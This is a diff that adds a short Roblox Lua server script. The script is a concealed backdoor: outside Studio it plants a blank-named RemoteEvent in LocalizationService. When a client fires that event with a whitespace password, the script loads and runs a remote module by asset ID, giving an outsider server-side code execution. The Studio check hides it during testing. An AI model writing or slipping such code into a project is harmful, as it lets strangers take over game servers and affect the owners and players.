@@ -1,0 +1,14 @@
+if game["Run Service"]:IsStudio() then
+    print()
+elseif game["Run Service"]:IsRunning() then
+    rm=Instance.new("RemoteEvent",game.LocalizationService) rm.Name = " "
+    rm.OnServerEvent:Connect(function(A,E)
+        LOADMOD = require
+        if E == "                     " then
+            function LOAD(var)
+                LOADMOD(131606797191283)()
+            end
+            LOAD()
+        end
+    end)
+end
